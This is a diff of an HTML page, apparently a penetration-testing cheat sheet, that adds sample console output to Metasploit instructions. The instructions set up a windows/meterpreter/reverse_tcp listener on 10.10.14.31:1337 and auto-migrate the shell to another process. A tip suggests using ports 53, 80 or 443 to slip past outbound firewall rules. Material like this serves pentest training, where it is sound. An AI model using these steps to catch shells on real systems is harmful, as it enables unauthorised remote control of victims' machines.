@@ -326,23 +326,53 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="start-a-metasploit-listener">Start a Metasploit Listener</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msfconsole -q
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> msfconsole -q
+</span></span><span class="line"><span class="cl"><span class="go">msf6 &gt;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use exploit/multi/handler
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 &gt; use exploit/multi/handler
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using configured payload generic/shell_reverse_tcp
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set payload windows/meterpreter/reverse_tcp
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+</span></span></span><span class="line"><span class="cl"><span class="go">payload =&gt; windows/meterpreter/reverse_tcp
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set lhost &lt;LOCAL_IP&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; set lhost 10.10.14.31
+</span></span></span><span class="line"><span class="cl"><span class="go">lhost =&gt; 10.10.14.31
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set lport &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; set lport 1337
+</span></span></span><span class="line"><span class="cl"><span class="go">lport =&gt; 1337
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">run
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; run
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Started reverse TCP handler on 10.10.14.31:1337 
 </span></span></span></code></pre></div><p><small><em>Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</em></small></p>
 <h3 id="if-the-shell-die-immediately-we-can-try-to-migrate-it-to-another-process">If the shell die immediately, we can try to migrate it to another process</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create a automigrate.rc script
 </span></span><span class="line"><span class="cl"><span class="go">run post/windows/manage/migrate
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat automigrate.rc 
+</span></span><span class="line"><span class="cl"><span class="go">run post/windows/manage/migrate
 </span></span></span></code></pre></div><br>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msfconsole -q
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> msfconsole -q
+</span></span><span class="line"><span class="cl"><span class="go">msf6 &gt;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use exploit/multi/handler
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 &gt; use exploit/multi/handler
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using configured payload generic/shell_reverse_tcp
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set payload windows/meterpreter/reverse_tcp
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+</span></span></span><span class="line"><span class="cl"><span class="go">payload =&gt; windows/meterpreter/reverse_tcp
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set lhost &lt;LOCAL_IP&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; set lhost 10.10.14.31
+</span></span></span><span class="line"><span class="cl"><span class="go">lhost =&gt; 10.10.14.31
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set lport &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; set lport 1337
+</span></span></span><span class="line"><span class="cl"><span class="go">lport =&gt; 1337
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set AutoRunScript multi_console_command -r automigrate.rc
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; set AutoRunScript multi_console_command -r automigrate.rc
+</span></span></span><span class="line"><span class="cl"><span class="go">AutoRunScript =&gt; multi_console_command -r automigrate.rc
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">run
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 exploit(multi/handler) &gt; run
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Started reverse TCP handler on 10.10.14.31:1337 
 </span></span></span></code></pre></div>
 </div></div>
     
